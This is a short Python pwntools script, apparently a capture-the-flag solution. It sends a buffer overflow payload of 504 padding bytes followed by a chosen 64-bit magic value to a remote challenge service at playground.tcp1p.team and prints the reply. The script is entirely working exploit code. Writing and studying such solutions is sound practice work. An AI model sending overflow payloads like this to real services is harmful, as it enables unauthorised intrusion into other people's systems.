from pwn import *
elf = context.binary = ELF("./pwnable")
p = remote("playground.tcp1p.team",23337)
# p = process()
offset = 504
dead = p64(0xdeadb19b00b5dead)
payload = b"A" * offset + dead
write("payload",payload)
p.sendline(payload)
print(p.recvall())